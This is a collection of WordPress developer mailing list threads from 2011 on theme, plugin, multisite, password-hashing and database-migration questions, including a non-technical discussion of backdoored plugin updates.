in core uses the dot notation to access the translations  (e.g 
autosave.autosaveL10N.autosaveInterval ) and the minus sign is not a 
valid character in variable names in JS.

Plus I imagine there a lot of third party scripts that would be broken 
for the very same reason.

You could filter posts_orderby and return something like

REPLACE( REPLACE( REPLACE( LOWER( $wpdb->post_title, 'the ', '' ), 'an ', '' ), 'a ', '' ) ASC

Disclaimer: could have a serious impact on performance!

Thank you very much guys, your suggestions certainly will be very useful :-)

For the moment I've just few doubts:

1) Does XMl RPC API allow me to access only to a standard set of
functions (get posts, publish posts, etc.) or I can define my custom
functions?
2) Using JSON could be an interesting solution, but in this way I
should implement my functions on the server and call them from
application mobile, right?

Thanks

Both.

There are a standard set of functions and an easy way for a plugin to add any custom ones you need.

If you want to talk details on XMLRPC integration you might want to join the wp-xmlrpc list - http://lists.automattic.com/mailman/listinfo/wp-xmlrpc

Subject: [wp-hackers] WP Menu - Showing wrong active class (for me anyway).
Message-ID: <4DFF5E68.2070902@gmail.com>

I have a WP Menu setup in the standard way in a theme.

That menu us made up of various pages including:
Home, Blog, Events, Contact.

example.com/blog
example.com/events
example.com/contact
etc

Events is a custom post type.

When visiting any of the top level "pages", the current active menu 
class is correctly added to the right part of the menu structure. So 
Contact adds a current class to the Contact menu item etc ...

When visiting an item of the "events" custom post type .. eg
http://example.com/events/event1
the current class gets added to the "Blog" menu item, and not the Events 
menu item.

Any idea why this is? How do I tell it that this is a child of Events, 
and not a child of Blog?
/events, /blog are all pages.

Thanks,
Rob

Thanks Mihai, good to know.

I guess, for my purposes, it's just as easy to echo a JSON object as it 
is to use wp_localize_script(), so I think I'll just do that.

Hi there

Out of curiosity: since you can move some directories around with a
user-defined constant, why didn't this get expanded to the wp-admin
directory?
(I'm surprised I didn't find any ticket suggesting this -- or my

Though that's only about having a custom URL. I'm sure there must be a
ticket about moving the files, but my quick search didn't turn
anything up.

Message-ID: <COL106-DS15FBE34D361190FB9D1E38BA510@phx.gbl>

http://pastebin.com/2WZyG940 

I?ve pasted the code above because for some reason when I update the post, the ?start date? doesn?t save into the meta as unixtime as it should ? it only saves as a string, and I end up getting errors.  The ?end date? does,  and that?s what?s confusing the heck out of me.  

Server is running php5 and apache on a bluehost shared install, if that helps.

Warning: date() expects parameter 2 to be long, string given in /home5/ccfedmon/public_html/wp-content/themes/ccfchurch/functions.php on line 468

Warning: date() expects parameter 2 to be long, string given in /home5/ccfedmon/public_html/wp-content/themes/ccfchurch/functions.php on line 470 

That?s what pops up in the editor (those numbers won?t match up to the functions.php because I?ve only brought in the code that deals with that specific area... but here?s the lines in question):

468 - $clean_sd = date("D, M d, Y", $meta_sd);
469 - $clean_ed = date("D, M d, Y", $meta_ed);
470 - $clean_st = date($time_format, $meta_st);
471 - $clean_et = date($time_format, $meta_et);

I?m stumped.  Any ideas would be fantastic.

It's something we haven't wanted to bother to support. Introducing this
means greater areas of test coverage and inherently more fragile code. I
wouldn't expect anything anytime soon. There's some ways I imagine with
filters and rewriting to move the URL, while leaving the directory in place.

Thanks.

Any custom post type "singles" don't show up under a custom post type 
"page" in the menu.

What, therefore, is the correct way to do a Custom Post Type "listing" 
page, so any children show under it in the menu? Eg like "blog home"?  :)

$password = "test";
$hash1 =  wp_hash_password($password);
$hash2 = echo wp_hash_password($password);

will echo two different values, despite the password being the same.

Is there a way to compare the two hashes to see if they came from the 
same password?

Or the actual question - need to see if a user is using the "default" 
password we supply them with?

This is because WordPress passwords are hashed with salts to help
defend against rainbow tables. This makes the same password hash to
different outputs.

Use wp_check_password -
http://codex.wordpress.org/Function_Reference/wp_check_password - and
input your default and the hash of the user's password.

Subject: [wp-hackers] boolean logic with tag and categorie url params?
Message-ID: <4E00FDBC.2020403@gmail.com>

Hi,

I've been (re)evaluating WordPress' ability to query post using _only_
the tag and category parameters for a project of mine. It's been a while
using this (roughly 3 years according to ticket #5433) and I wondered
what the current state would be.

Thus far my conclusion is that it's a lot better then it used to be,
however there seems no support to be for a combination of boolean AND
with an boolean OR unless using a combination of categories and tags is
used. So I cannot force the query to do something like: 'give me all
posts with tag1 and tag2 and either tag3 or tag4'. Is this correct?

Here are some examples of the urls I tested (trying to write a coherent
blog post on this..)

1. domain.ext/blogname/?tag=tag1+tag2
Shows only posts with both tags

2. domain.ext/blogname/?tag=tag1+tag2,tag3
Shows all posts tagged with one or more of these tags tag1, tag2, or
tag3. It does NOT show the posts with at least tag1 and then either tag2
or tag3 (or both).

3. domain.ext/blogname/?category_name=Category2&tag=tag1+tag2
Shows only posts in Category2 tagged with both tag1 and tag2

4. domain.ext/blogname/?category_name=Category2,Category1&tag=tag1+tag2
Shows posts in one or both categories as long as the post has been
tagged with both tags

Ps: Is there more documentation on the url parameters in relation to
querying? I tried the Codex, but I might have missed something?

grtz

In-Reply-To: <4E00FDBC.2020403@gmail.com>
References: <4E00FDBC.2020403@gmail.com>
Message-ID: <BANLkTimTXjmaD454W-vVMaDD5=5TZR=-GA@mail.gmail.com>

So the query is "(tag1 AND tag2) AND (tag3 OR tag4)", correct?

You won't be able to do something so complex from the URL alone, for
sure. URL parsing is intentionally simple in this respect. No amount
of weird syntax will cover all cases.

But you might get it with an advanced taxonomy query. I have not tried
it, however this might do the trick (and it might only work in 3.2 and
up too):

query_posts(array('tax_query' => array(
	'relation' => 'AND',
	array(
		'taxonomy' => 'post_tag',
		'terms' => array('tag1', 'tag2'),
		'field' => 'slug',
		'operator' => 'AND',
	),
	array(
		'taxonomy' => 'post_tag',
		'terms' => array('tag3', 'tag4'),
		'field' => 'slug',
		'operator' => 'IN',
	),
)));

To combine that with categories, you'd use the category taxonomy as
another bit in your advanced query.

Hi,

As far as I know there are no constants available such as WP_SITEURL or
RELOCATE which make changing locations for a WordPress Multisite
installation easier. Is this correct? Are there any plans for making the
deployment from local machine to a testserver easier? Thanks in advance!

Message-ID: <BANLkTik6-X32PGUm4ZwiAX3h3f-AD5COdw@mail.gmail.com>

Howdy all,
I was one of the users that blindly updated one of the affected
plugins (WPtouch). I quickly updated to the recommended clean version
as soon as I heard about the exploit, but the descriptions of the
attack thus far have been free of details. I'd like to know more about
what, if any, of my site's data was compromised and how best to keep
watch over my sites in case any follow-on exploits are attempted.

Was it simply insertion of spam links in body content, or did it call
home? Did it send in-flight passwords, or DB contents, or file
locations, or did it traverse my filesystem to check for other
potentially-vulnerable software?

It was an insertion of backdoor code. Somebody would have had to later
target your site specifically in order to get anything from it. It
didn't do anything by itself, other than leave a hole open.

Given the timeframe, it's unlikely they got anything out of it. It
didn't really go to that many sites, all told.

So there was no "beacon" or "call-home" functionality? It was a
passive bit of code waiting for an exploit and didn't alert the
malfeasants to its installation?

Phew.

Yes. It was cleverer than a simple exec or eval. But, as pointed out, did
not do anything at all on it's own.

At least, I can confirm that for the wptouch backdoor as that is the only
one I updated. I've assumed the others were the same/similar.

Different methods, but equally cleverly hidden.

To help mitigate this sort of thing, plugin committers will now get
emails for every check in to their plugins:
http://wpdevel.wordpress.com/2011/06/22/plugin-committers-now-receive-svn-notify-emails-with/

So if something gets checked in to one of your plugins, you get an
email with the diff of what got checked in. If it's bad or if you
didn't do it or even if you're just not sure about it, you can email
security at wordpress.org so they can take a look and figure out the
issue.

I do not know any specific list related to WordPress security.
Sometimes, there are reports in the Full Disclosure list

Thanks for the link to seclists.org fulldisclosure
Quite an onslaught of sec info.

As I understand the situation here:

wp.org is hosting some plugins.
Three (or more?) plugins were updated with trojans
wp.org (and friends) discover these trojans
wp.org takes steps to remove the trojans.
wp.org pushes an update.
wp.org takes steps to prevent or mitigate such future events.

All of this is quite laudable. Good job.
The one step that seems to be missing is
wp.org sends message to interested listeners letting them know what is
happening.

Based on the excellent performance in each of the other steps, I
figure there must be a twitter, facebook, email list, blog, something
where this information would have been communicated.

Thanks to Doug, I found out about it here. But, it would be good to
have a little more of an ear to the ground on such issues. Hence, the
hunt for where to put my ear.

Claude

As Mitch pointed out: http://wordpress.org/news/.

Also, naturally, that blog is included in the WordPress Planet feed:
http://planet.wordpress.org/

And the Planet feed shows up on the Dashboard of every WordPress

Have you actually var_dump()'d the four variables? Clearly two of them
(likely one of them, as then another is a copy) is a string. :-)

After some effort, I've launched a plugin for handle post types and special data, just as advised by theme reviewers team.http://wordpress.org/extend/plugins/ada-plugin/ 

Right now, I have an issue on localizing it. There's no way to localize the post type files and metabox itens (three files), the contextual help and the metabox itens.

Is there any special gettext for that? Or the init are in wrong place?

Thanks for any help.

Subject: [wp-hackers] switch_themes capability and managing widgets
Message-ID: <BANLkTi=kfxbx0scP-5aADBsrQJrZ9ixbWg@mail.gmail.com>

A quickie... Does anyone know the rationale behind switching themes
and editing widgets being controlled by the same capability? As far as
I can tell it is the same capability for these two things.

Only, I have clients to whom I want to give the Editor role (so they
don't control anything site-critical like managing plugins), and the
site is based around a custom theme that basically shouldn't be
switched. But as they're editors, naturally they need to manage the
widgets, the content and settings etc.

Am I missing something or do I have to give them the possibility of
switching themes in order that they manage widgets?

cheers,

Steve

Message-ID: <65BDACEA-3C1C-4BBD-8DC1-6DB73903C8E7@graymerica.com>

I am trying to use the data I have stored in Buddypress user profile as part of a custom post type loop.

I can get the author's name/ID/etc and other wordpress functions with " <?php the_author_meta( 'ID' ); ?> "

Is it possible to get buddypress profile information by using a function like this, and the userID?  bp_get_member_profile_data()

I am trying to connect the profile data to the post.

thanks,

Andrew

It's not the same capability, Switching themes is controlled by
switch_themes, Editing Widgets, Menu's and Theme options is controlled by
'edit_theme_options'
By default, Only the administrator has the edit_theme_options capability,
this comes down to most editors on sites not being trusted to modify any
site specific settings.

You should be able to use any role manager/capability editor to either add
the theme options cap to the editor role, or create a site owner role with
the required caps.

If memory serves, the function you're looking for is bp_get_profile_info.
It's either located on the core BuddyPress files or somewhere in the
xprofile files. I can get the exact function reference for you later
tonight, though a grep through the BuddyPress files may reveal what you
need.

I was mistaken. The function is bp_get_profile_field_data, which accepts an
array as its only argument. Supplying array keys *field* and user_id, where
field is the numeric field ID, will return the corresponding database entry.

For example: bp_get_profile_field_data( array( 'field' => 1, 'user_id' =>
$user_id ) );

Many thanks Dion. Should have spent some time digging in the core
source rather than Googling :-\

I've got Justin Tadlock's Members plugin, so the rest is easy :)

I'm converting a homegrown site, not written by myself, to WordPress.
The site consists of a bunch of static HTML pages and some PHP pages.

The PHP pages grab data from a DB and display the data, stuff like
that, nothing to serious.
Currently I've created a page for every old PHP page and by using
shortcodes I call the necessary function to display the data.

Am I on the right track or is there a better solution?

What kind of data is stored in the db for the static site?

You can also use the wpdb class to use a secondary database if you wish.

Have a look at this

Hey,

I'm new to wordpress plugin developement, and my question is concerning
"public" forms and custom post type,
I'd like to know if it's possible to output a form on a page, which allows
to post non-registered users content, which will be handled by a custom post
type,
Do you have any resource on the wp-codex, which I could read?

Cheers

Charel, WordPress doesn't have native functionality for this. You'll need to use a plugin or program something custom. Here are the plugins I recommend:

Gravity Forms
http://www.gravityforms.com/

PodsCMS:

I am already connecting to the secondary database, that's not a problem.

I'm just pondering if creating a page with a shortcode for every old PHP
page is the best solution or if there is a better solution.

Message-ID: <AAE8BB12-6AA3-4F33-A255-BF41C9B21B2C@gmail.com>

Hi all,

Hopefully this makes sense - we're building a site for a client that needs to be in both English and Spanish, so I got the WPML plugin. Another requirement, though, is that they want the Spanish site to be accessed via a different domain than the English site. It appears, though, that using the networked site option means that all the domain names each have their own content that's separate from the other.

Is it possible to have multiple domains accessing the same WP install, without having them set up as different sites on the same network?

Thanks,
Josh

Peter,

Is the any reason for the data to remain in a separate database? Is it
structured enough that you could import it into WordPress?

Hi --

Virtual Multiblog can do that.

Not quite core, but as stable a hack as you're likely to find. ;-)

I would suggest looking at domain mapping for this.

I'm not sure how out would work with wpml, but it allows two different
domains ti map to the same wp site content.

Thanks for the tip. This isn't exactly what I want to do, but I think this'll help me figure out how to do it.

Thanks for the response Mike. 

Can you tell me how domain mapping allows for that behavior? To me, it appears that each different domain name has its own discrete content.

Domain mapping allows you to have one domain's content e.g.
subsite.myhosting.com appear to be on myotherdomain.com. Normally you would
want all visitors to be redirected to myotherdomain.com, but, crucially, you
don't have to do that. So if a visitor comes in on subsite.myhosting.com the
content is served with that domain, if they come in on
myotherdomain.comthey stay on that domain.

So, in your case, you could set up, for example, the english site on
myenglishdomain.com and then use domain mapping to also serve the same WP
site as midominioespanol.es

You might have to hack WPML to use the domain name to recognise which
language to serve (instead of the path /en or /es or query var kang=es).  Or
you could possibly use a simple .htaccess trick to always add ?lang=es to
the midominioespanol.es  domain.

You're probably loading the textdomain too late.

	widgets.php
Message-ID: <BANLkTi=rM7bFiB_U5DY4bPnu2LuNPn3eUA@mail.gmail.com>

Hey folks,

Getting something odd going on with Widgets. In the context of a
theme, I am attempting to add customised widgets. For ease of coding,
widgets live in another file includes/widgets.php.

If I do, in the functions.php file:

require_once('includes/widgets.php');

function buffer_widgets_init () {
    register_widget('buffer_latest_features_widget');
}
add_action('widgets_init', 'buffer_widgets_init');

Then it fails with a message: Fatal error: Class
'buffer_latest_features_widget' not found in
/Users/alex/Sites/wp-includes/widgets.php on line 324. However, if I
copy and paste the whole code in includes/widgets into the
functions.php file, lo and behold, it finds the
buffer_latest_features_widget class.

The same is true if I rename the file as anything but widgets.php and
move it anywhere - works fine.

Is there any reason for this or am I doing something stupid or wrong?
What's going on?

Thanks a lot.

Alex

Your include() line is trying to include the widgets.php file inside
wp-admin/includes. You should either use a full path in your
include(), or rename the file.

Sorry, I meant your require_once() line, not include().

Interesting - why then are all the other includes working fine? I was
copying the practice I'd seen on the Roots plugin, so assumed it was
fine.

Thanks a lot.

I've run into that same problem with an export.php file but, for the life of me, can't figure out what in PHP is causing "wp-admin/includes" to have priority over the current directory?  I'd really like to learn how this works so I'll be able to anticipate such problems in the future.  If you or anyone else knows, I'd be thankful for an explanation.

Thanks for reply,

I'm not sure about this, the contextual help for post types are translated 
but the post type pages itself aren't, could you check the main file 
wp-ada.php and tell if is wrong?!

Hi,

My functions.php contains no functions, just includes to files (about
30) holding the code, but I use:

<?php include (TEMPLATEPATH . "/widgets/general-widgets.php"); ?>

Have thousands of customers using themes with the above format and not
had a single problem.

Hey Folks -

The following is what I do when I deploy/relocate a WP install. Was  
wondering if there is a faster or more efficient way to do it?

1) Backup www.olddomain.com

If olddomain isn't the same length as newdomain you will need to re-serialise the data help in the wp-options table.

Could you elaborate on this? Curious as to why I am not having trouble  
with this method even when domain names are not the same char lengths.

I think he's talking about re-salting your site. 

If he's not, its still a good idea to do this after moving a site.

Do this in your wp-config file. Check around line 36, you will see whats below. 
 
/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0

Re salting is a good idea. But I'm talking about the serialised data in the database.

I'm a bit new to this. Can you elaborate or give a url pointer that
will give a little more about how one would go about doing this?

No, he's talking about serialized data in the database, which looks
something like
a:3:{s:18:"nav_menu_locations";a:1:{s:7:"primary";i:3;}s:12:"header_image";s:77:"
http://www.yourdomain.com/wp-content/themes/twentyten/images/headers/path.jpg";s:16:"background_color";s:6:"FFFFFF";}
. The s:# indicates the length of the string, and if the actual length of
the string does not match that number, that array will no longer be valid
and you will lose the use of whatever data is in there. In the case of what
I pasted over, you would lose any theme options you set, such as the nav
menu, header image, and background color. There's plenty of serialized data
in the WordPress database, and if your domain names are different lengths
you really should run a script of some kind to properly reserialize. It's
possible that you just haven't noticed something being wrong or you are
fortunate not to currently have anything immediately noticeable that uses
the serialized data, but that doesn't mean that nothing is breaking. There
are some tools out there to help you do this (e.g.
http://interconnectit.com/124/search-and-replace-for-wordpress-databases/ -
not personally tested)

Well, then here is a question. This plugin has been recommend to me  
for this process a couple of times and also found it with a repetuable  
blog post :

Blog Post:
http://yoast.com/move-wordpress-blog-domain-10-steps/

Plugin:
http://wordpress.org/extend/plugins/search-and-replace/

Is that plugin re-serializing the database?

In short yep.  The Link to the search replace is ok, but doesn't do 2-3 level serialised data.  That said it is a good start.

This script comes in handy for searching/replacing in the WP database. It
handles serialized data.

Subject: [wp-hackers] Why not json or xml instead of serialised data in DB
Message-ID: <BANLkTi=joGE=78P1dj=gon_iMxte=VyNBw@mail.gmail.com>

Just saw a post regarding how to move your domain on wp-hackers, and saw the
issue of serialised data. I knew it from before but just thought it'd be
extremely benefitial if wordpress used json or xml (json in particular).

Although, I know it just takes one function to deserialise an array, same
level of simplicity can be introduced for a json file as well. I'm proposing
this because there are a lot of issues with serialised data in DB. For one
if there is just a change of single byte, the data goes corrupt. This
creates a lot of unneeded trouble for non-technical users.

I'm sure I've missed some points as to why wordpress isn't using json and
I'm sure the developers must've already given a thought about it. Can
someone enlighten me?

The json data format doesn't support all the same formats as PHP data
can be. Javascript has limitations on variable names, for example.
Also objects don't retain all the information when you put them in
json. Things like that. PHP Serialization makes more sense if you're
going to be processing the data in PHP. JSON serialization only really
makes sense to send data to a browser to be used by javascript code.

As for changing the data directly, if you have to do that, then kinda
you're doing it wrong to start with, really. If you want to mess with
the data, mess with it in PHP instead of directly.

Using json in a php application I found that a single comma out of
place could render the data un-usable. Surely a result of my being a
newb to php. I use json well enough. But I have take as granted that
one had better keep p's and q's nice and tight.

I would imagine JSON and XML especially require more resources to turn back into an array than serializing.

I agree with that. JSON doesn't retain object information, but one can
typecast it, I suppose. Also, if one is storing a simple array, JSON is as
good as serialize with added flexibility. However, json_encode and
json_decode isn't available for PHP<5.0.

People are doing normal search and replace to change domain names in sql
dumps, which must've caused lots of trouble if domain length was different.
Let's just hope the 'Move wordpress' project in GSoC is successful this
time.

Surprisingly not. From the tests I've done, json_encode is faster than 
serialize for most things (serialize only beat json_* for very small 
arrays), and the same for json_decode/unserialize.

Personally, I prefer json_encode/json_decode because I tend to be 
storing arrays instead of actual objects (or stdClass objects anyway), 
and the speed is worth it for me (I'm storing 10k+ objects).

YMMV,

Correct. Never rely on include_path. It's slow and obviously not always
going to pull the file you want. All paths should be absolute, ideally. That
means using one of these, as appropriate:

For core, there's ABSPATH, WPINC, WP_CONTENT_DIR, etc. For themes, there's
TEMPLATEPATH and STYLESHEETPATH and various helper functions. For plugins,
there's plugin_dir_path(), which is just an alias for dirname(__FILE__), my
personal preference in general.

... and probably a few others I'm not recalling, depending on your
situation.

Worth noting that plugin_dir_path() will trailingslashit() though, so 
it's personal preference as to which of those you'd prefer.

Another neat way to load files from within a theme is to use
WordPress' get_template_part( 'includes/widgets') instead of a regular
include() or require(). This allows a child theme to override these
files in the same way core template files are overridden if they're
present. Might be worth suggesting to the theme author.

Roots uses get_template_part all over the shop - its a great example
of a very modern and very highly tweaked WordPress theme. For clarity
though I like to have my bits of actual code included and have bits of
templates using this.

Subject: [wp-hackers] Plugins and network activations
Message-ID: <4E09BE19.4060801@duechiacchiere.it>

Hi all,

I've developed a plugin for Wordpress that needs some extra tables in 
order to work properly. A few users have complained that when they try 
to "network-activate" it, it only works on the main blog.

So I found this discussion about how Wordpress should support these 
activations, but I don't understand how we plugin developers should 
handle the activation process

http://core.trac.wordpress.org/ticket/14170

Can someone please elaborate on it, maybe posting an example or a 
snippet of code?

Thank you!
Dino

This [1] is the code I use in one of my plugins. Basically you detect
if the activation is network-wide or not, and loop over each blog,
installing the tables in turn.

*Beware* though, that this code is likely to timeout (ie. hit PHP's
script execution time limit) if you have hundreds of blogs in your
network, especially if you're adding tables to each blog. My plugin is
only deployed in controlled environments so I know it'll be fine. If
your plugin is going to be made publicly available you should look
into a method similar to what scribu does in his Proper Network
Activation plugin [2].

John,

thank you for your feedback. I'm actually suggesting my users to install 
Scribu's plugin before they activate mine network-wide. Unfortunately 
some of them still report that it didn't help, and that only the tables 
for the main blog were created. I guess I'll have to look into adding 
some ajax to my plugin. My only concern is that this should be handled 
by Wordpress, not the plugin developers :)

Best,
Dino

The correct solution is to not have a table per blog in a Multisite install.

Your plugin should either work with the existing table structure or introduce a global table because it needs to do something fundamentally different or not expect to work on any reasonably sized multisite install when network activated without manual work to create the tables.

Running through a table creation for every blog on a large multisite install is not scalable and is probably not what you need :)

True, but what about uninstalling the plugin? How do I make sure no 
other instances are still referencing the global table?

Thank you,

 For me, I noticed a strange thing about network activation.

 I made a little test with 2 blogs and a network admin 
 activation/deactivation (register_activation_hook / 
 register_deactivation_hook). In the activation, I create a table for 
 each blog, and in the deactivation, I remove the table.

 My results are :
 - The activation is triggered for each blog. (Actually, only main blog 
 at this time, but when I go into the dashboard of the second blog, it 
 seems to be activate at this time because I see the table into my DB)
 - For the deactivation, only the main blog is triggered, even I go into 
 the dashboard of the second blog.

 So, why I didn't have the same behavior for Activation/Deactivation ?


 Thanks.

 Tommy

Using get_stylesheet_directory() would also work for non-template-part files
intended to be over-ridden by Child Themes. Though, for something like
Widgets code (that isn't likely to be over-ridden), I would use
get_template_directory(), and if the Child Theme wants to override specific
Widgets, it can unregister_widget()/register_widget().

The get_template_part function was never really intended to function
in that manner. It works, but is slightly sub-optimal for that use
case, and it is conceivable that this sort of use will stop working at
some point in the future.

Instead, consider using this:

locate_template('includes/widgets.php', true, true);

First true means to load the file, second true means to require_once
it (instead of simply requiring it). This also checks child themes as
well.

Subject: [wp-hackers] [WordPress] How to compare salted password
Message-ID: <BANLkTikk6XBty-Ax33iaD_nzVQiYCWbPiA@mail.gmail.com>

Hi all,

I need to compare a specific password with all password stored in the
database. I know that WordPress uses MD5 to cypher passwords but uses
also a salt, so I can't compare my specific password, after MD5
cyphering, with the stored by WordPress one.

Which is the salt used by WordPress to cypher passwords? How can I
apply the same salt for comparing?

Thanks

WordPress uses the phpass library. You should check out how
wp_check_password() works, or just hash it with wp_hash_password() and use
that against the DB.

You have to use wp_check_password. Using wp_hash_password and
comparing directly won't work, because it produces a different hash
every time. Random salts, random number of hashing passes.

WordPress never needs to create new tables for *all* blogs in a network in
one go. The new tables are created for one blog when that blog is created.

There are no scaling issues with that process.

I've been thinking about this a lot lately as we're exploring building a SaaS using WordPress as a base.

I definitely agree that the current process does not scale to have to add tables when a plugin needs tables to all sites.  So you proposed one option to create a shared table that has blog_id as a field so only one table needs to be added. But doesn't that effectively create a hybrid architecture where parts of the data are sharded and parts are not? 

My understanding is that WordPress uses a sharding approach to enable scalability, yet it is recommending to not use sharding for extensions; isn't that contradictory? If sharding is the appropriate architecture for WordPress' tables why is it not the appropriate architecture for plugin's tables?

Or is this simple a case of "Yes, it's not a great situation but it's all we got at the moment?"  And if that is the case, maybe it would make sense to come up with a better solution (i.e. a way that it is possible to add new tables to other blogs without timeout?)

If you've noticed, WordPress itself avoids changing its tables as much
as possible. Every time they do, they have to write special code to
handle wp.com and its 25 million sites in a scalable upgrade
mechanism.

Scaling will always be hard. You just have to determine the best way
to support it for your specific custom data. There's plenty of
options:

1. Don't use separate tables. This is the best approach, but not
feasible in all cases.
2. Use one global table. Works, but if the dataset is large or the
number of blogs is large, then sharding may be preferred.
3. One or more tables per site. Scaling this is hard for having to
create and/or alter tables. You might be able to get away with a
create-when-not-there approach, as long as your check for "not-there"
is optimized. If not, then you have to give admins a way to
create/upgrade all sites. WordPress does this with a network admin
approach, with the upgrade-network functionality, when the tables have
to be altered. In this case, avoiding alters is the best policy
because of the very-large-sites scaling problems.

I've seen this with a few of my recently updated plugins.  On the plugin 
page on extend, their last updated time is incorrect.

Here's an example of my Members plugin:
http://wordpress.org/extend/plugins/members/

It was just updated a week or two ago but still has a last updated date 
of "2009-9-22".  Anyone else running into this issue after updating 
their plugins?

Well I guess I had the same kind of issue.
When I update my plugins they don't show up in the recently updated
list.

The date seems to be fine with my plugins.

It seems hit and miss for me, the versions update but the date seems to only work sometimes then ... out of the blue, it works without me having updated anything. I put it down to a cache somewhere along the line.

Hi List,
I am wondering if there is a recommended way to secure an outbound API call
one of my plugins needs to make using SSL?

Will this create any extra dependencies on my users installing the plugin?
If so, what?

Thanks in advance

Making outgoing SSL requests on random hosts is a huge pain :)  It
works almost everywhere, but spectacularly fails on some (bad) hosts.

WordPress 3.2 (currently in RC3, with the real release coming soon)
reduces the pain significantly with the wp_http_supports() function
[1].  With it, you can tell if the host can *probably* make outgoing
SSL requests.  It's up to you to decide if you should continue over
HTTP if there's no support.

That function won't help detect the case where the host has all the
right software in place (openSSL, etc.) but has no certificate
authority file on hand to verify the SSL certificate of the host
you're connecting to.  You'll have to trap those errors manually by
examining the WP_Error objects that get returned by wp_remote_*().  If
you see those errors, it's up to you to decide if you should resend
the request with sslverify set to false.

Yes and no.

If we for example take the example of a "subscribe to comments" plugin in a multisite install a table per blog is probably wrong for a number of reasons:

1) You can't do anything clever like digesting all emails across all blogs easily
2) You can't provide a single manage my subscriptions UI if the data is sharded across every blog's tables.

In a large install some data needs to be sharded and some needs to be global which is exactly what WordPress itself does - some of the tables in a multisite install are global - users, usermeta, ...

That make perfect sense. Yes, some data should definitely be global. 

But by the same token won't you agree that some should be site-specific, i.e. a post relationships table or a table for taxonomy meta, for example?

Hiya-

I've had a patch to WP Core that's been sitting around in Trac for 5 months
and I can't seem to get anyone to pay attention to it.  It's just something
that didn't get carried over from WP MU to 3.0 -- a one line change, but a
fairly significant one.

How can I get a dev to actually apply the patch?

Thanks

If they contain data you don't want to access globally and don't fit the current schema then yes.

I would recommend that any plugin that relies on them is written to do something along the following lines:

1) Create the tables in single site when activated.
2) Create the tables when a new blog is created in multisite
3) Comes with an example script to go back and create the tables for pre-existing multisite blogs.

It just doesn't make sense to try and do the table creation at the point of network activation.

Thanks for clarifying.  I misunderstood and thought you were saying "Don't create per-site tables."
